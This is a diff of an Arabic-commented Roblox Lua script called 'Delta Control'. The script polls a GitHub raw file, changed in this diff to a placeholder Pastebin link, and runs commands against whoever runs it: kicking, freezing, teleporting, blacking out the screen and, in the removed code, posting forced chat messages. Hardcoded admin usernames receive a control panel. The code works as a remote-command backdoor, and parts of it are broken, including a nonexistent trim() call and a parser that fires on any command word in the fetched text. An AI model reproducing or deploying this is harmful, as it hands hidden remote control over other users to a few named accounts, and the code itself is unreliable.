@@ -1,35 +1,22 @@
--- 🚀 Delta Control - GitHub Edition
+-- 🚀 Delta Control System v1.0
 local Players = game:GetService("Players")
 local HttpService = game:GetService("HttpService")
 local LocalPlayer = Players.LocalPlayer
 
--- 🔧 ضع رابط الجيتهاب الخام هنا:
-local GITHUB_RAW_URL = "https://raw.githubusercontent.com/Fsclor/Wa7eed/refs/heads/main/ERORR"
+-- 🔗 ضع رابطك الخام هنا:
+local COMMAND_URL = "https://pastebin.com/raw/XXXXXX"
 
--- المسؤولين
-local ADMINS = {
-    ["sj3zx"] = "king",
-    ["sj3zxx"] = "admin",
-    ["sj3zxxx"] = "admin",
-    ["sj3zxxx3"] = "admin"
-}
-
--- تحقق إذا مسؤول
-local function IsAdmin()
-    return ADMINS[LocalPlayer.Name] ~= nil
-end
-
--- الأوامر
+-- الأوامر المدعومة
 local Commands = {
-    ["طرد"] = function(reason)
-        LocalPlayer:Kick("🚫 " .. (reason or "تم طردك من قبل المسؤول"))
-    end,
-    
     ["kick"] = function(reason)
-        LocalPlayer:Kick("🚫 " .. (reason or "Kicked by admin"))
+        LocalPlayer:Kick(reason or "🚫 تم طردك")
     end,
     
-    ["تجميد"] = function()
+    ["طرد"] = function(reason)
+        LocalPlayer:Kick(reason or "🚫 تم طردك")
+    end,
+    
+    ["freeze"] = function()
         if LocalPlayer.Character then
             local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
             local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -38,9 +25,9 @@ local Commands = {
         end
     end,
     
-    ["freeze"] = function() Commands["تجميد"]() end,
+    ["تجميد"] = function() Commands["freeze"]() end,
     
-    ["ايقاف تجميد"] = function()
+    ["unfreeze"] = function()
         if LocalPlayer.Character then
             local humanoid = LocalPlayer.Character:FindFirstChild("Humanoid")
             local root = LocalPlayer.Character:FindFirstChild("HumanoidRootPart")
@@ -49,167 +36,183 @@ local Commands = {
         end
     end,
     
-    ["unfreeze"] = function() Commands["ايقاف تجميد"]() end,
+    ["ايقاف تجميد"] = function() Commands["unfreeze"]() end,
     
-    ["سحب"] = function()
+    ["bring"] = function()
         if LocalPlayer.Character and LocalPlayer.Character:FindFirstChild("HumanoidRootPart") then
             LocalPlayer.Character.HumanoidRootPart.CFrame = CFrame.new(0, 100, 0)
         end
     end,
     
-    ["bring"] = function() Commands["سحب"]() end,
+    ["سحب"] = function() Commands["bring"]() end,
     
-    ["شاشه سوداء"] = function()
+    ["black"] = function()
         local gui = Instance.new("ScreenGui")
         gui.Name = "BlackScreen"
-        gui.Parent = game.CoreGui
-        
         local frame = Instance.new("Frame")
         frame.Size = UDim2.new(1, 0, 1, 0)
         frame.BackgroundColor3 = Color3.new(0, 0, 0)
         frame.Parent = gui
+        gui.Parent = game.CoreGui
     end,
     
-    ["black screen"] = function() Commands["شاشه سوداء"]() end,
+    ["شاشه سوداء"] = function() Commands["black"]() end,
     
-    ["ايقاف الشاشه السوداء"] = function()
+    ["unblack"] = function()
         local blackScreen = game.CoreGui:FindFirstChild("BlackScreen")
         if blackScreen then blackScreen:Destroy() end
     end,
     
-    ["stop black screen"] = function() Commands["ايقاف الشاشه السوداء"]() end,
-    
-    ["يكتب"] = function(text)
-        if text and text ~= "" then
-            pcall(function()
-                game:GetService("ReplicatedStorage"):WaitForChild("DefaultChatSystemChatEvents")
-                    :WaitForChild("SayMessageRequest"):FireServer(text, "All")
-            end)
-        end
-    end,
-    
-    ["say"] = function(text) Commands["يكتب"](text) end,
-    
-    ["عمك"] = function()
-        Commands["يكتب"]("عمي " .. LocalPlayer.Name)
-    end
+    ["ايقاف الشاشه"] = function() Commands["unblack"]() end
 }
 
--- ========== نظام المراقبة ==========
-local function MonitorCommands()
-    print("📡 جاري مراقبة الأوامر من GitHub...")
-    
-    local lastContent = ""
-    
+-- تحقق إذا مسؤول
+local ADMINS = {"sj3zx", "sj3zxx", "sj3zxxx", "sj3zxxx3"}
+local function IsAdmin()
+    for _, admin in pairs(ADMINS) do
+        if LocalPlayer.Name == admin then
+            return true
+        end
+    end
+    return false
+end
+
+-- تخزين بيانات اللاعبين
+local _G = getgenv and getgenv() or _G
+_G.DeltaPlayers = _G.DeltaPlayers or {}
+
+-- تحديث بياناتي
+spawn(function()
+    while task.wait(5) do
+        _G.DeltaPlayers[LocalPlayer.Name] = {
+            time = os.time(),
+            admin = IsAdmin()
+        }
+    end
+end)
+
+-- نظام المراقبة
+spawn(function()
     while task.wait(3) do
-        local success, content = pcall(function()
-            return HttpService:GetAsync(GITHUB_RAW_URL)
-        end)
-        
-        if success and content ~= lastContent then
-            lastContent = content
+        pcall(function()
+            local text = HttpService:GetAsync(COMMAND_URL)
+            local myName = LocalPlayer.Name:lower()
             
-            -- معالجة كل سطر
-            for line in content:gmatch("[^\r\n]+") do
-                -- تنسيق: لاعب|أمر|سبب
-                local parts = {}
-                for part in line:gmatch("[^|]+") do
-                    table.insert(parts, part)
-                end
-                
-                if #parts >= 2 then
-                    local target = parts[1]:trim()
-                    local command = parts[2]:trim()
-                    local extra = parts[3] and parts[3]:trim() or ""
-                    
-                    -- إذا الأمر موجه لي
-                    if target:lower() == LocalPlayer.Name:lower() then
-                        local cmdFunc = Commands[command]
-                        if cmdFunc then
-                            print("🎯 تنفيذ أمر: " .. command .. " -> " .. target)
-                            cmdFunc(extra)
-                        end
+            if text:lower():find(myName) then
+                for cmd in text:gmatch("%S+") do
+                    local cmdFunc = Commands[cmd:lower()]
+                    if cmdFunc then
+                        cmdFunc()
+                        break
                     end
                 end
             end
-        elseif not success then
-            print("⚠️ خطأ في الاتصال بـ GitHub")
-        end
+        end)
     end
-end
+end)
 
--- ========== واجهة المسؤولين ==========
-local function CreateAdminPanel()
+-- إنشاء الواجهة للمسؤولين
+if IsAdmin() then
     local screenGui = Instance.new("ScreenGui")
-    screenGui.Name = "GitHubControlPanel"
+    screenGui.Name = "DeltaControl"
     screenGui.Parent = game.CoreGui
     
+    -- الإطار الرئيسي
     local mainFrame = Instance.new("Frame")
-    mainFrame.Size = UDim2.new(0, 300, 0, 200)
-    mainFrame.Position = UDim2.new(0.02, 0, 0.7, 0)
+    mainFrame.Size = UDim2.new(0, 260, 0, 180)
+    mainFrame.Position = UDim2.new(0.02, 0, 0.75, 0)
     mainFrame.BackgroundColor3 = Color3.fromRGB(20, 20, 30)
-    mainFrame.BorderColor3 = Color3.fromRGB(0, 255, 0)
+    mainFrame.BorderColor3 = Color3.fromRGB(0, 200, 0)
     mainFrame.BorderSizePixel = 2
     mainFrame.Active = true
     mainFrame.Draggable = true
     mainFrame.Parent = screenGui
     
+    -- العنوان
     local title = Instance.new("TextLabel")
-    title.Size = UDim2.new(1, 0, 0, 25)
+    title.Size = UDim2.new(1, 0, 0, 30)
     title.BackgroundColor3 = Color3.fromRGB(0, 100, 0)
-    title.Text = "👑 GitHub Control - " .. LocalPlayer.Name
+    title.Text = "👑 Delta Control"
     title.TextColor3 = Color3.new(1, 1, 1)
     title.Font = Enum.Font.GothamBold
     title.Parent = mainFrame
     
-    local statusLabel = Instance.new("TextLabel")
-    statusLabel.Size = UDim2.new(0.9, 0, 0, 40)
-    statusLabel.Position = UDim2.new(0.05, 0, 0.15, 0)
-    statusLabel.Text = "📡 متصل بـ GitHub\n⚡ جاهز لإرسال الأوامر"
-    statusLabel.TextColor3 = Color3.new(0, 1, 0)
-    statusLabel.BackgroundTransparency = 1
-    statusLabel.TextXAlignment = Enum.TextXAlignment.Left
-    statusLabel.Parent = mainFrame
+    -- عدد اللاعبين
+    local playerCount = Instance.new("TextLabel")
+    playerCount.Size = UDim2.new(0.9, 0, 0, 30)
+    playerCount.Position = UDim2.new(0.05, 0, 0.2, 0)
+    playerCount.Text = "👥 اللاعبون: 0"
+    playerCount.TextColor3 = Color3.new(0, 1, 0)
+    playerCount.BackgroundTransparency = 1
+    playerCount.TextXAlignment = Enum.TextXAlignment.Left
+    playerCount.Parent = mainFrame
     
-    local infoLabel = Instance.new("TextLabel")
-    infoLabel.Size = UDim2.new(0.9, 0, 0, 60)
-    infoLabel.Position = UDim2.new(0.05, 0, 0.4, 0)
-    infoLabel.Text = "📝 اذهب لـ GitHub وقم بتعديل ملف:\ncommands.txt\n\nتنسيق: لاعب|أمر|سبب"
-    infoLabel.TextColor3 = Color3.new(1, 1, 1)
-    infoLabel.BackgroundTransparency = 1
-    infoLabel.TextXAlignment = Enum.TextXAlignment.Left
-    infoLabel.TextSize = 12
-    infoLabel.Parent = mainFrame
+    -- حقل كتابة الأمر
+    local commandInput = Instance.new("TextBox")
+    commandInput.Size = UDim2.new(0.9, 0, 0, 35)
+    commandInput.Position = UDim2.new(0.05, 0, 0.45, 0)
+    commandInput.PlaceholderText = "اكتب: لاعب أمر"
+    commandInput.Text = ""
+    commandInput.TextColor3 = Color3.new(1, 1, 1)
+    commandInput.BackgroundColor3 = Color3.fromRGB(40, 40, 50)
+    commandInput.Parent = mainFrame
     
-    local linkButton = Instance.new("TextButton")
-    linkButton.Size = UDim2.new(0.4, 0, 0, 25)
-    linkButton.Position = UDim2.new(0.3, 0, 0.8, 0)
-    linkButton.Text = "🌐 فتح GitHub"
-    linkButton.BackgroundColor3 = Color3.fromRGB(0, 120, 200)
-    linkButton.TextColor3 = Color3.new(1, 1, 1)
-    linkButton.Parent = mainFrame
+    -- زر الإرسال
+    local sendButton = Instance.new("TextButton")
+    sendButton.Size = UDim2.new(0.4, 0, 0, 30)
+    sendButton.Position = UDim2.new(0.05, 0, 0.75, 0)
+    sendButton.Text = "🚀 إرسال"
+    sendButton.BackgroundColor3 = Color3.fromRGB(0, 150, 0)
+    sendButton.TextColor3 = Color3.new(1, 1, 1)
+    sendButton.Parent = mainFrame
     
-    linkButton.MouseButton1Click:Connect(function()
-        -- رابط التعديل على GitHub
-        local editURL = "https://github.com/YOUR_USERNAME/YOUR_REPO/edit/main/commands.txt"
-        print("📝 افتح الرابط لتعديل الأوامر:", editURL)
+    -- حالة النظام
+    local status = Instance.new("TextLabel")
+    status.Size = UDim2.new(0.5, 0, 0, 20)
+    status.Position = UDim2.new(0.5, 0, 0.75, 0)
+    status.Text = "⚡ نشط"
+    status.TextColor3 = Color3.new(0, 1, 0)
+    status.BackgroundTransparency = 1
+    status.Parent = mainFrame
+    
+    -- تحديث عدد اللاعبين
+    local function UpdatePlayerCount()
+        local count = 0
+        for playerName, data in pairs(_G.DeltaPlayers) do
+            if os.time() - data.time < 30 then
+                count = count + 1
+            end
+        end
+        playerCount.Text = "👥 اللاعبون: " .. count
+    end
+    
+    -- زر الإرسال
+    sendButton.MouseButton1Click:Connect(function()
+        local text = commandInput.Text
+        if text ~= "" then
+            status.Text = "📤 جاري..."
+            commandInput.Text = ""
+            
+            -- هنا راح تحتاج تروح للرابط وتكتب الأمر يدوياً
+            print("📝 اذهب للرابط وأكتب: " .. text)
+            
+            task.wait(1)
+            status.Text = "✅ أرسل"
+            task.wait(2)
+            status.Text = "⚡ نشط"
+        end
     end)
     
-    return screenGui
-end
-
--- ========== بدء النظام ==========
-print("🎮 GitHub Control System - جاري التحميل...")
-
--- تشغيل نظام المراقبة
-spawn(MonitorCommands)
-
--- إنشاء واجهة للمسؤولين
-if IsAdmin() then
-    CreateAdminPanel()
-    print("✅ أنت مسؤول - الواجهة نشطة")
+    -- تحديث تلقائي
+    spawn(function()
+        while task.wait(5) do
+            UpdatePlayerCount()
+        end
+    end)
+    
+    print("✅ واجهة التحكم جاهزة!")
 else
     print("🔒 النظام يعمل في الخلفية")
 end
 
-print("🚀 GitHub Control - جاهز للعمل!")
+print("🎮 Delta Control - جاهز!")
